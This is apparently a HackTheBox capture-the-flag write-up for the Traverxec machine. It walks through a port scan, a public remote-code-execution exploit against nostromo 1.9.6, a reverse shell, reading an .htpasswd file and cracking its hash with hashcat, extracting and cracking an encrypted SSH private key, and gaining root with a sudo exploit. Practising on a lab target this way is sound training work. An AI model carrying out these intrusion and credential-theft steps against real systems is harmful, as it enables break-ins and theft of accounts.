---
categories: [HackTheBox]
tags: [Password Cracking, PrivEsc, Public Exploit]
image:
  path: /Vulnhub-Files/img/Traverxec/front.png
  alt: https://www.hackthebox.com/achievement/machine/595651/217
---

### Lets see the IP address →

```bash
IP : 10.10.10.165
```
{: .nolineno}

## Port Scan Results ➡️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Traverxec]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.10.165
[sudo] password for kali: 
Starting Nmap 7.94 ( https:/nmap.org ) at 2023-07-21 12:26 IST
Nmap scan report for 10.10.10.165
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
Service Info: ; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}

## Web Enumeration ⤵️

![Untitled](/Vulnhub-Files/img/Traverxec/Untitled.png)

Lets search an exploit related to `nostromo 1.9.6`  →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Traverxec]
└─$ searchsploit nostromo 1.9.6]
------------------------------------------------ ---------------------------------
 Exploit Title                                  |  Path]
------------------------------------------------ ---------------------------------
nostromo 1.9.6 - Remote Code Execution          | multiple/remote/47837.py]
------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
{: .nolineno}

Lets try it out now →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Traverxec]
└─$ python2 cve2019-16278.py 10.10.10.165 80 whoami

                                        _____-2019-16278
        _____  _______    ______   _____\       _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       |     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  | \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/

HTTP/1.1 200 OK
Date: Fri, 21 Jul 2023 07:09:46 GMT
Server: nostromo 1.9.6
Connection: close

www-data
```
{: .nolineno}

Now lets try reverse shell command execution from it →

![Untitled](/Vulnhub-Files/img/Traverxec/Untitled%201.png)

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Traverxec]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.213] from (UNKNOWN) [10.10.10.165] 51210
whoami
www-data
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$ id    
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@traverxec:/usr/bin$
```
{: .nolineno}

Found something interesting →

```bash
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd 
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
www-data@traverxec:/var/nostromo/conf$
```
{: .nolineno}

Now with the help of hashcat I decoded the password of david →

```bash
hashes.txt = $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

commands : hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt
```
{: .nolineno}

![Untitled](/Vulnhub-Files/img/Traverxec/Untitled%202.png)

```bash
$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
```
{: .nolineno}

But each time I use this password it says invalid →

```bash
www-data@traverxec:/home$ su david
Password: 
su: Authentication failure
www-data@traverxec:/home$
```
{: .nolineno}

Lets find something else →

Now while checking the `nostromo/conf/nhttpd.conf` →

![Untitled](/Vulnhub-Files/img/Traverxec/Untitled%203.png)

so since I am not allowed to enter into david so lets list file inside of david user using `public_www` →

```bash
www-data@traverxec:/home/david$ ls -al public_www/
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
www-data@traverxec:/home/david$ ls -al public_www/protected-file-area/
total 16
drwxr-xr-x 2 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
www-data@traverxec:/home/david$
```
{: .nolineno}

Now lets see inside the `backup-ssh-identity-files.tgz` file →

```bash
www-data@traverxec:/home/david$ tar -tvf public_www/protected-file-area/backup-ss
sh-identity-files.tgz
drwx------ david/david       0 2019-10-25 17:02 home/david/.ssh/
-rw-r--r-- david/david     397 2019-10-25 17:02 home/david/.ssh/authorized_keys
-rw------- david/david    1766 2019-10-25 17:02 home/david/.ssh/id_rsa
-rw-r--r-- david/david     397 2019-10-25 17:02 home/david/.ssh/id_rsa.pub
www-data@traverxec:/home/david$
```
{: .nolineno}

Now if I can extract data so extract at /tmp/Data location so for that I used this command →

```bash
tar zxvf /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz -C /tmp/Data
```
{: .nolineno}

```bash
www-data@traverxec:/tmp/Data$ find .
.
./home
./home/david
./home/david/.ssh
./home/david/.ssh/authorized_keys
./home/david/.ssh/id_rsa
./home/david/.ssh/id_rsa.pub
www-data@traverxec:/tmp/Data$
```
{: .nolineno}

Lets see the `id_rsa` file here →

```bash
www-data@traverxec:/tmp/Data/home/david/.ssh$ cat id_rsa]
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w]
-----END RSA PRIVATE KEY-----
www-data@traverxec:/tmp/Data/home/david/.ssh$
```
{: .nolineno}

Lets see the paraphrase of `id_rsa` from cracking it through `john the ripper` →

![Untitled](/Vulnhub-Files/img/Traverxec/Untitled%204.png)

Lets try the SSH login now with password and private key too →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Traverxec]
└─$ ssh david@traverxec.htb -i id_rsa
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ ls -al
total 36
drwx--x--x 5 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 root  root  4096 Oct 25  2019 ..
lrwxrwxrwx 1 root  root     9 Oct 25  2019 .bash_history -> /dev/null
-rw-r--r-- 1 david david  220 Oct 25  2019 .bash_logout
-rw-r--r-- 1 david david 3526 Oct 25  2019 .bashrc
drwx------ 2 david david 4096 Oct 25  2019 bin
-rw-r--r-- 1 david david  807 Oct 25  2019 .profile
drwxr-xr-x 3 david david 4096 Oct 25  2019 public_www
drwx------ 2 david david 4096 Oct 25  2019 .ssh
-r--r----- 1 root  david   33 Jul 21 00:14 user.txt
david@traverxec:~$ cat user.txt
44321fe1b9364d36aee2333a9ccb0715
david@traverxec:~$
```
{: .nolineno}

Now I find the version of sudo outdated so I tried this exploit directly and I got what I wanted →
[exploit_nss.py File](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py)

```bash
www-data@traverxec:/$ sudo -V
Sudo version 1.8.27
Sudoers policy plugin version 1.8.27
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.27
www-data@traverxec:/$
```
{: .nolineno}

```bash
david@traverxec:/tmp$ python exploit.py
# /bin/bash -i
root@traverxec:/tmp# whoami
root
root@traverxec:/tmp# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(david)
root@traverxec:/tmp# cd /root
root@traverxec:/root# ls -al
total 64
drwx------  3 root root  4096 Nov 12  2019 .
drwxr-xr-x 18 root root  4096 Sep 16  2022 ..
lrwxrwxrwx  1 root root     9 Oct 25  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root  4096 Nov 12  2019 .local
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root 37520 Oct 25  2019 nostromo_1.9.6-1.deb
-r--------  1 root root    33 Jul 21 00:14 root.txt
root@traverxec:/root# cat root.txt
f0310cddcfa7d2fa7927fead112c5bf3
root@traverxec:/root#
```